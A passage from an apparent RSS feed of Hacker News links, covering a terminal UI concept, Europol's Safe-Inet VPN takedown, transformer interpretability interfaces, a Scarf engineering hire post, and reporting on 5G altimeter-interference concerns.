src="https://markessien.com/img/posts/superterm4.jpg" alt="SuperTerm"></p><p>Running 6 servers like I do, I probably have about 20 passwords per server. Thatâ€™s 120 passwords I need to regularly reference - and they are all in my password manager, which sits somewhere very far away (by click-count). What if all the passwords were right there in the terminal - so when I need MySQL root password, I can just access it.</p><p><img src="https://markessien.com/img/posts/superterm2.jpg" alt="SuperTerm"></p><p>If you are installing something complex, you often need to reference history. Either to copy some command or to check if you did things right. History is long, and scrolls your screen. Itâ€™s inconvenient to use. What if you could simply show it in the sidebar anytime you wanted? That would spead up my work immensely.</p><p><img src="https://markessien.com/img/posts/superterm3.jpg" alt="SuperTerm"></p><p>(Btw, there is a grid view also, in case you need to view up to 4 terminals from different servers at once.) But generally, I feel the above would make terminal work far more convenient for people who work with a lot of servers.</p></section></div>]]>
            </description>
            <link>https://markessien.com/posts/terminal-concept/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508230</guid>
            <pubDate>Tue, 22 Dec 2020 16:48:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[VPN Safe-Inet has been taken down by Europol]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25508164">thread link</a>) | @giuliomagnifico
<br/>
December 22, 2020 | https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action | <a href="https://web.archive.org/web/*/https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Law enforcement wiretapped the very service used by criminals to evade interception</p><div><p>The virtual private network (VPN) Safe-Inet used by the worldâ€™s foremost cybercriminals has been taken down yesterday in a coordinated law enforcement action led by the German Reutlingen Police Headquarters together with Europol and law enforcement agencies from around the world.&nbsp;</p>
<p>The Safe-Inet service was shut down and its infrastructure seized in Germany, the Netherlands, Switzerland, France and the United States. The servers were taken down, and a splash page prepared by Europol was put up online after the domain seizures. This coordinated takedown was carried out in the framework of the <a href="https://www.europol.europa.eu/empact">European Multidisciplinary Platform Against Criminal Threats (EMPACT)</a>.&nbsp;</p>
<h3>Turning the table on the criminals&nbsp;</h3>
<p>Active for over a decade, Safe-Inet was being used by some of the worldâ€™s biggest cybercriminals, such as the ransomware operators responsible for ransomware, E-skimming breaches and other forms of serious cybercrime.&nbsp;</p>
<p>This VPN service was sold at a high price to the criminal underworld as one of the best tools available to avoid law enforcement interception, offering up to 5 layers of anonymous VPN connections.</p>
<p>Law enforcement were able to identify some 250 companies worldwide which were being spied on by the criminals using this VPN. These companies were subsequently warned of an imminent ransomware attack against their systems, allowing them to take measures to protect themselves against such an attack.<br>
The service has now been rendered inaccessible.&nbsp;</p>
<p>Investigations are ongoing in a number of countries to identify and take action against some of Safe-Inetâ€™s users. &nbsp;</p>
<h3>International cyber sweep&nbsp;</h3>
<p>International police cooperation was central to the success of this investigation as the critical infrastructure was scattered across the world.</p>
<p>Europolâ€™s <a href="https://www.europol.europa.eu/about-europol/european-cybercrime-centre-ec3">European Cybercrime Centre (EC3) </a>supported the investigation from the onset, bringing together all the involved countries to establish a joint strategy and to organise the intensive exchange of information and evidence needed to prepare for the final phase of the takedown.&nbsp;</p>
<p>The <strong>Police President of the Reutlingen Police Headquarters, Udo Vogel</strong>, said:</p>
<blockquote><p>The investigation carried out by our cybercrime specialists has resulted in such a success thanks to the excellent international cooperation with partners worldwide. The results show that law enforcement authorities are equally as well connected as criminals.&nbsp;</p>
</blockquote>
<p>The <strong>Head of Europolâ€™s European Cybercrime Centre, Edvardas Å ileris</strong>, said:</p>
<blockquote><p>The &nbsp;strong working relationship fostered by Europol between the investigators involved in this case on either side of the world was central in bringing down this service. &nbsp;Criminals can run but they cannot hide from law enforcement, and we will continue working tirelessly together with our partners to outsmart them.</p>
</blockquote>
<h3>Participating agencies</h3>
<ul><li><strong>Germany:</strong> Reutlingen Police Headquarters (PolizeiprÃ¤sidium Reutlingen)</li>
<li><strong>The Netherlands: </strong>National Police (Politie)</li>
<li><strong>Switzerland:</strong> Cantonal Police of Argovia (Kantonspolizei Aargau)&nbsp;</li>
<li><strong>United States: </strong>&nbsp;Federal Bureau of Investigation</li>
<li><strong>France: </strong>Judicial Police (Direction Centrale de la Police Judiciaire)</li>
<li><strong>Europol:</strong> European Cybercrime Centre (EC3)&nbsp;</li>
</ul></div></div>]]>
            </description>
            <link>https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508164</guid>
            <pubDate>Tue, 22 Dec 2020 16:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interfaces for Explaining Transformer Language Models]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508118">thread link</a>) | @Brajeshwar
<br/>
December 22, 2020 | https://jalammar.github.io/explaining-transformers/ | <a href="https://web.archive.org/web/*/https://jalammar.github.io/explaining-transformers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        











<p>Interfaces for exploring transformer language models by looking at input saliency and neuron activation.</p>

<div>

<div>
<figure>
    <figcaption>
        <strong>Explorable #1:</strong>  Input saliency of a list of countries generated by a language model<br>
         <strong>Tap or hover over</strong> the <strong>output tokens</strong>:</figcaption>
    
    <br>
    <figcaption>
    <br>
        <strong>Explorable #2:</strong>  Neuron activation analysis reveals four groups of neurons, each is associated with generating a certain type of token<br>
        <strong>Tap or hover over</strong> the sparklines on the left to isolate a certain factor:</figcaption>
    
    <br>
</figure>
    </div>
</div>

<!--
<div class="toc">
    <h3>Contents</h3>
    <ul>
        <li>
            <a href="#introduction">Introduction</a>
        </li>
        <li>
            <a href="#saliency">Input Saliency</a>
        </li>
        <li>
            <a href="#evolution">Evolution of Hidden States</a>
        </li>
        <li>
            <a href="#activations">Neuron Activations</a>
        </li>
        <li>
            <a href="#conclusion">Conclusion & Future Work</a>
        </li>
    </ul>
</div>
-->

<p id="introduction">The Transformer architecture<cite key="vaswani2017attention"></cite>
    has been powering a number of the recent advances in NLP. A breakdown of this architecture is provided <a href="https://jalammar.github.io/illustrated-transformer/">here</a> <cite key="alammar2018illustrated"></cite>. Pre-trained language models based on the architecture,
    in both its auto-regressive<cite key="liu2018generating,radford2018improving,radford2019language,brown2020language"></cite> (models that use their own output as input to next time-steps and that process tokens from left-to-right, like GPT2)
    and denoising<cite key="devlin2018bert,liu2019roberta,lan2019albert,lewis2019bart,raffel2019exploring"></cite> (models trained by corrupting/masking the input and that process tokens bidirectionally, like BERT)
    variants continue to push the envelope in various tasks in NLP and, more recently, in computer vision<cite key="dosovitskiy2020image"></cite>. Our understanding of why these models work so well, however, still lags behind these developments.
</p>

<p>This exposition series continues the pursuit to interpret<cite key="rogers2020primer,atanasova2020diagnostic"></cite>
    and visualize<cite key="vig2019visualizing,madsen2019visualizing,hoover2020,tenney2020language,wallace2019allennlp"></cite>
    the inner-workings of transformer-based language models.

We illustrate how some key interpretability methods apply to transformer-based language models. This article focuses on auto-regressive models, but these methods are applicable to other architectures and tasks as well.
     
</p>

<p>This is the first article in the series. In it, we present explorables and visualizations aiding the intuition of:</p>
<ul>
    <li>
        <strong>Input Saliency</strong> methods that score input tokens importance to generating a token.
    </li>
    <li>
        <strong>Neuron Activations</strong> and how individual and groups of model neurons spike in response to
        inputs and to produce outputs.
    </li>
</ul>

<p>The next article addresses <strong>Hidden State Evolution</strong> across the layers of the model and what it may tell us about each layer's role.</p>

<!--more-->

<!--
    <li>
        <strong>Attention</strong>, a central concept in transformers, and how recent work<cite key="abnar2020quantifying"></cite>
        leads to visualizations that are more faithful to its role.
    </li>
-->

<p>In the language of Interpretable Machine Learning (IML) literature like Molnar et al.<cite key="molnar2020interpretable"></cite>, input saliency is a method that explains individual predictions. The latter two methods fall under the
    umbrella of "analyzing components of more complex models", and are better described as increasing the transparency<cite key="du2019techniques,carvalho2019machine"> </cite> of transformer models.
</p>

<p>Moreover, this article is accompanied by <a href="https://github.com/jalammar/ecco/tree/main/notebooks">reproducible notebooks</a> and <a href="https://github.com/jalammar/ecco/">Ecco - an open source library</a> to create similar
    interactive interfaces directly in Jupyter notebooks<cite key="ragan2014jupyter"></cite>
    for GPT-based<cite key="radford2018improving"></cite> models from the HuggingFace transformers library<cite key="wolf2019huggingface"></cite>.
</p>

<p>If we're to impose the three components we're examining to explore the architecture of the transformer, it would look like the following figure.</p>
<figure>
    <img src="https://jalammar.github.io/images/explaining/transformer-input-saliency-hidden-states-neuron-activations.png">
    <figcaption>
        <strong>
            Figure: Three methods to gain a little more insight into the inner-workings of Transformer language models.
        </strong> <br>
        By introducing tools that visualize input saliency, the evolution of hidden states, and neuron activations, we aim to enable researchers to build more intuition about Transformer language models.
    </figcaption>
</figure>

<hr>

<h2 id="saliency">Input Saliency</h2>

<p>When a computer vision model classifies a picture as containing a husky, saliency maps can tell us whether the classification was made due to the visual properties of the animal itself, or because of the snow in the background<cite key="ribeiro2016whyribeiro2016why"></cite>. This is a method of <i>attribution</i> explaining the relationship between a model's output and inputs -- helping us detect errors and biases, and better understand the behavior of the system.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/dog-saliency-map.jpg">
    <figcaption>
        <strong>
            Figure: Input saliency map attributing a model's prediction to input pixels.
        </strong> <br>
    </figcaption>
</figure>

<p>Multiple methods exist for assigning importance scores to the inputs of an NLP model<cite key="li2015visualizing,arrieta2020explainable"></cite>. The literature is most often concerned with this application for classification tasks, rather than natural
    language generation. This article focuses on language generation. Our first interface calculates feature importance after each token is generated, and by
    hovering or tapping on an output token, imposes a saliency map on the tokens responsible for generating it.
</p>

<p>
    The first example for this interface asks GPT2-XL<cite key="radford2019language"></cite> for William Shakespeare's date of birth. The model is correctly able to produce the date (1564, but broken into two tokens: " 15" and "64", because the model's vocabulary does not include " 1564" as a single token). The interface shows the importance of each input token when generating each output token:
</p>
<figure>

    
    
    <figcaption>
        <strong>Explorable: Input saliency of Shakespeare's birth
            year using Gradient Ã— Input.</strong>
        <strong>Tap or hover over</strong> the output tokens.<br>
        GPT2-XL is able to tell the birth date of William Shakespeare expressed in two tokens. In generating the
        first token, 53% of the importance is assigned to the name (20% to the first name, 33% to the last name).
        The next most important two tokens are " year" (22%) and " born" (14%). In generating the second token to
        complete the date, the name still is the most important with 60% importance, followed by the first portion
        of the date -- a model output, but an input to the second time step. <br>
        This prompt aims to probe world knowledge. It was generated using greedy decoding. Smaller variants of GPT2
        were not able to output the correct date.
    </figcaption>
</figure>

<p>Our second example attempts to both probe a model's world knowledge, as well as to see if the model
    repeats the patterns in the text (simple patterns like the periods after numbers and like new lines, and
    slightly more involved patterns like completing a numbered list). The model used here is DistilGPT2<cite key="sanh2020distilbert"></cite>.
</p>

<p>This explorable shows a more detailed view that displays the attribution percentage for each token -- in case you need that precision.</p>

<figure>
   
    
    <br>
    <figcaption>
        <strong>Explorable: Input saliency of a list of EU countries</strong> <br>
        <strong>Tap or hover over</strong> the output tokens.<br>
        This was generated by DistilGPT2 and attribution via Gradients X Inputs. Output sequence is cherry-picked to
        only include European countries and uses sampled (non-greedy) decoding. Some model runs would include China,
        Mexico, and other countries in the list. With the exception of the repeated " Finland", the model continues
        the list alphabetically.

    </figcaption>
</figure>

<p>Another example that we use illustratively in the rest of this article is one where we ask the model to complete
    a simple pattern:</p>

<figure>
   
    
    
    <figcaption>
        <strong>Explorable: Input saliency of a simple
            alternating pattern of commas and the number one.</strong>
        <strong>Tap or hover over</strong> the output tokens.<br>
        Every generated token ascribes the first token in the input the highest feature importance score. Then
        throughout the sequence, the preceding token, and the first three tokens in the sequence are often the most
        important. This uses Gradient Ã— Inputs on GPT2-XL. <br>
        This prompt aims to probe the model's response to syntax and token patterns. Later in the article, we build
        on it by switching to counting instead of repeating the digit ' 1'. Completion gained using greedy decoding.
        DistilGPT2 is able to complete it correctly as well.
    </figcaption>
</figure>

<p>It is also possible to use the interface to analyze the responses of a transformer-based conversational agent.
    In the following example, we pose an existential question to DiabloGPT<cite key="zhang2020dialogpt"></cite>:
</p>

<figure>

    
    
    <figcaption>
        <strong>Explorable: Input saliency of DiabloGPT's answer to the ultimate question</strong> <br>
        <strong>Tap or hover over</strong> the output tokens.<br>
        This was the model's first response to the prompt. The question mark is attributed the highest score in the
        beginning of the output sequence. Generating the tokens " will" and " ever" assigns noticeably more importance to
        the word " ultimate".
        This uses Gradient Ã— Inputs on DiabloGPT-large.

    </figcaption>
</figure>

<p><a href="https://colab.research.google.com/github/jalammar/ecco/blob/main/notebooks/Ecco_Input_Saliency.ipynb"><img src="https://jalammar.github.io/images/explaining/colab-badge.svg"></a>
</p>

<h3>About Gradient-Based Saliency</h3>
<p>Demonstrated above is scoring feature importance based on Gradients X Inputs<cite key="denil2015extraction,shrikumar2017just"></cite>-- a gradient-based saliency method shown by Atanasova et al.<cite key="atanasova2020diagnostic"></cite>
    to perform well across various datasets for text classification in transformer models.
</p>

<p>To illustrate how that works, let's
    first recall how the model generates the output token in each time step. In the following figure, we see how
    <span>â‘ </span>
    the
    language model's final hidden state is projected into the model's vocabulary resulting in a numeric score for
    each
    token in the model's vocabulary. Passing that scores vector through a softmax operation results in a probability
    score for each token. <span>â‘¡</span> We proceed to select a token
    (e.g. select the highest-probability scoring token, or sample from the top scoring tokens) based
    on
    that vector.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/111.PNG">
    <figcaption>
        <strong>
            Figure: Gradient-based input saliency
        </strong>
    </figcaption>
</figure>

<p><span>â‘¢</span> By calculating the gradient of the
    selected logit (before the softmax) with respect to the inputs by back-propagating it all the way back to the
    input tokens, we get a signal of how important each token was in the calculation resulting in this generated
    token.
    That assumption is based on the idea that the smallest change in the input token with the highest
    feature-importance
    value makes a large change in what the resulting output of the model would be.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/gradXinput.PNG">
    <figcaption>
        <strong>
            Figure: Gradient X input calculation and aggregation
        </strong>
    </figcaption>
</figure>

<p>The resulting gradient vector per token is then multiplied by the input embedding of the respective token. Taking
    the L2 norm of the resulting vector results in the token's feature importance score. We then normalize the
    scores by dividing by the sum of these scores.</p>

<p>More formally, <span>gradient</span> Ã— <span>input</span> is described as follows:</p>

<p>
    <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">âˆ¥</mo><msub><mi mathvariant="normal">âˆ‡</mi><msub><mi>X</mi><mi>i</mi></msub></msub><msub><mi>f</mi><mi>c</mi></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mn>1</mn><mo>:</mo><mi>n</mi></mrow></msub><mo stretchy="false">)</mo><msub><mi>X</mi><mi>i</mi></msub><msub><mo stretchy="false">âˆ¥</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex"> \lVert \nabla _{X_i} f_c (X_{1:n})  X_i\lVert_2</annotation></semantics></math></span></span>
</p>

<p>
    Where <span id="input_term"></span> is the embedding vector of the input token at timestep <i>i</i>, and <span id="grad"></span> is the back-propagated gradient of the score of the selected token unpacked as follows:
</p>
<ul>
    <li>
        <span id="input_embeddings"></span> is the list of â€¦</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jalammar.github.io/explaining-transformers/">https://jalammar.github.io/explaining-transformers/</a></em></p>]]>
            </description>
            <link>https://jalammar.github.io/explaining-transformers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508118</guid>
            <pubDate>Tue, 22 Dec 2020 16:40:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nix core contributor joins Scarf to build foundations of new developer tooling]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508112">thread link</a>) | @aviaviavi
<br/>
December 22, 2020 | https://about.scarf.sh/post/shea-levy-composition-fanatic | <a href="https://web.archive.org/web/*/https://about.scarf.sh/post/shea-levy-composition-fanatic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Hello Scarf followers! I'm Shea, Scarf's new VP of Engineering. This post is to share some of who I am, what problems I'm interested in, and why that brought me to Scarf. I hope it gives you a sense of what this new role means for our mission to give open source maintainers observability into the distribution and usage of their projects!</p><p>In my career so far, I've been exposed to a wide array of problem domains and industries. I've worked in embedded hardware, industrial sensors, online retail, personalized marketing, inventory management, SaaS platforms, statistical analysis for research... It's been a fascinating journey! While my roles and responsibilities have varied, over time I've developed a number of themes in my approach to work:</p><ul role="list"><li>I am passionate about the big-picture product perspective. I am not satisfied writing a single line of code until I understand what value we're trying to create, for whom, and why the task at hand helps achieve that.</li><li>I consider proper organizational structure and practices to be crucial to my own effectiveness, not to mention the overall success of the effort. Team values, formal process, responsibilities, expectations, etc. should be as carefully designed and cultivated as the product itself.</li><li>I gravitate toward "force multiplier" aspects of the work. I'm much more likely to build a tool that helps build the end-user features than to build the feature itself, more likely to tie all of the components together than to build the component itself. My success is often measured by the problems that don't arise and the lack of difficulty others face in their work. I tend to <a href="https://startupsunplugged.com/startup-data/selling-shovels-in-the-new-gold-rush/">sell shovels, not mine gold</a>.</li></ul><p>Essentially, I'm focused on designing and building the foundations and framework required to successfully achieve the right goals.</p><h2>Barriers to composition</h2><p>One of the most important cognitive methods in an engineerâ€™s repertoire is <strong>compositional thinking</strong>, i.e. thinking about a system in terms of fundamental components viewed as units to be combined in order to achieve the relevant functionality. We can concretize this as a set of questions to ask yourself: What are the basic building blocks of this domain, what are their individual natures, and how should we put them together to build a system whose combined characteristics meet our needs?</p><p>Suppose, for example, we want to improve the development experience for our engineering team. We break down each developerâ€™s workflow into steps, understand the importance of these individual steps to the developerâ€™s job, and then look at how they lead into and support each other to guide our approach to implementing each individual stage and their interfaces. Or, we want to compute how much inventory to send from our distribution centers to our stores to ensure customers find what theyâ€™re looking for with minimal operational costs. In this case, we break down the computation into individual calculations that can be solved separately, identify the inputs required for those calculations (including previous calculations!), and combine all of the steps to get the desired result.</p><p>It's hardly a novel observation that composition is a central activity in software engineering (or really in any field). Why, then, is it usually much more difficult than it needs to be? If I've already done the hard work of identifying which tools would be useful for developers on my team, why do we then each need to manually fight with our package managers to get the right versions installed? Iâ€™ve figured out what each of our microservices should do and how they should interoperate. Now not only do I need an infrastructure expert to get them deployed into production, but I need a completely different system for my teammates to run them locally. Why?</p><p>In most domains, a significant amount of our time is spent translating from our carefully designed notions of our systems to the ad hoc, operational, leaky abstractions that implement them, or working around mismatches between what we wanted and what the system is able to give. And that's before we even consider composing <em>across</em> domains! We can do better.</p><h2>Breaking the barriers with Scarf</h2><p>So where does Scarf fit in? Scarf is dedicated to the same things I am: laying the social and technical foundations and building the tools to enable developers to work more effectively, to acquire better information about the value of their products, and to trade the higher quality work that results for the resources needed to go further. In particular, effective composition is a core technical requirement for Scarf.&nbsp; Our entire approach is centered around understanding and improving how end-users leverage our maintainers' products to build their own, a deeply compositional process!</p><p>Scarf wants to improve composition, and so do I; I know how to do it, and Scarf can make it a success. We see an opportunity to work together to make this a reality.</p><p>And so that's what I'll be working on! There is a lot of development to do and many minds to convince; watch this space to follow along with what's next!</p></div></div></div></div>]]>
            </description>
            <link>https://about.scarf.sh/post/shea-levy-composition-fanatic</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508112</guid>
            <pubDate>Tue, 22 Dec 2020 16:40:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Military Investigating Potential for 5G Towers to Crash Aircraft]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507952">thread link</a>) | @voldemort1968
<br/>
December 22, 2020 | https://smosa.com/military-investigating-potential-for-5g-towers-to-crash-aircraft/ | <a href="https://web.archive.org/web/*/https://smosa.com/military-investigating-potential-for-5g-towers-to-crash-aircraft/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>Over a dozen commercial aviation groups warned in the week leading up to an auction of part of the C-band electromagnetic spectrum that, as one study stated, selling could result in 'catastrophic failures' with the potential for 'multiple deaths.' By Dec. 8, The Federal Communications Commission began the auction.</p><p>The aviation groups are worried that 5G spectrum operations sold by the FCC could cause interference which would provide imprecise altimeter readings.</p><p>According to a <a href="https://www.defensenews.com/2020/12/21/the-military-is-scrambling-to-understand-the-aviation-crash-risk-from-a-new-5g-sale/?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+air-force-times%2Fnews%2Fyour-air-force+%28Air+Force+Times+-+Arc+RSS+-+Your+Air+Force%29">memo received by Defense News</a>, the President of the Federal Aviation Administration and #2 at the Transportation Department expressed these fears and are calling on the FCC to delay the sale to research the safety issue more closely. The FCC, in particular, has said that its own technological tests entail little to no risk and plans to proceed.</p><figure><img src="https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="@jacksondavidoficial" srcset="https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@jacksondavid?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Jackson David</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Meantwhile, the Pentagon has not yet assessed the effect of combat aircraft and has not formalized a position on selling. The Defense Department is already grappling with the auction in progress to keep up. The Defense Department and other agencies met on December 21 to "discuss findings and develop a way forward" Honeywell Industries, a major maker of radar altimeters, will consider potential solutions from that meeting.</p><p>The warnings by detractors are loud and clear: "There will be accidents, property will be destroyed and people will die," an official says.</p><p>â€œThe results of the study performed clearly indicate that this risk is widespread and has the potential for broad impacts to aviation operations in the United States, including the possibility of catastrophic failures leading to multiple fatalities, in the absence of appropriate mitigations,â€ said the RTCA, a private company partnering with the FAA to establish standards of safety</p><figure><img src="https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="" srcset="https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@worldsbetweenlines?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Patrick Hendry</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>The C-3.7â€“3.98 band's GHz frequency component at present is comparatively silent, mostly protected by low powered satellites. Once 5G telecommunications in the 3.7-3.98 portion of the band have been developed, there is a "significant danger" of "harmful interference"</p><p>â€œThese RTCA findings are alarming; they not only align with earlier research identifying harmful effects of 5G networks to radio altimeters, but they reflect a clear need for the FCC to return to the drawing board with this premature plan,â€ said Rep. Peter DeFazio, the Oregon Democrat who leads the House committee in a letter to FCC Chairman Ajit Pai on Dec 7, â€œThere is no question that additional study is needed to understand the full extent and severity of 5G interference with radio altimeters and whether any mitigations are feasible â€” or even possible â€” to ensure flight safety."</p><blockquote>â€œWe must never take a chance with aviation safety â€” and at no point should commercial interests be placed above it.â€</blockquote><p>The FCC and the expanding 5G backers claim that the fears are unfounded.</p><p>The transport airplanes and air-borne refueling tankers run by the Air Mobility Command of the Air Force will be more impeded by intervention by 5G due to their similarity in comparison to commercial aircraft.</p><p>For military planes, low flying trips over land like mountains will be the biggest problem. When flying above the ground, fighter pilots use their radar altimeters to stop enemy radars or surface-to-air attacks. Holmes noticed, however, that not all combat jets, including the F-15C era of the 1970s, had radar altimeters, and pilots could still rely on visual indicators.</p><figure><img src="https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Instrument Gauges" srcset="https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@kent_pilcher?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Kent Pilcher</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><blockquote>In the C-Band Order, the Commission concluded that our rules would protect radio altimeters used by aircraft, and we continue to have no reason to believe that 5G operations in the C-Band will cause harmful interference to radio altimeters, among other things, these altimeters operate with more than 200 megahertz of separation from the C-band spectrum to be auctioned, more protection than is afforded in some other countries."</blockquote><blockquote>"Moreover, the RTCA report was prepared outside of the joint aviation/wireless industry group that was set up at the Commissionâ€™s request and is not a consensus position of that group. Indeed, at least one other member of that multi-stakeholder group has expressed significant concerns with the study and several of its assumptions, and the Commissionâ€™s experts have concerns with this study as well."</blockquote><p>â€”Will Wiquist, a spokesman for the FCC in a statement</p><p>It takes time and funding to replace or adjust altimeters, Holmes says. Defense analysts are forecasting that this quantity will be short in the coming years. The military must give up manpower, time and productivity to solve the dilemma, he says. One source cited the cost of replacing "float altimeters" at "several billion dollars at a low estimate."</p><!--kg-card-begin: html--><p><a href="https://twitter.com/smosadotcom?ref_src=twsrc%5Etfw" data-show-count="false">Follow @smosadotcom</a></p><!--kg-card-end: html-->
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article></div>]]>
            </description>
            <link>https://smosa.com/military-investigating-potential-for-5g-towers-to-crash-aircraft/</link>
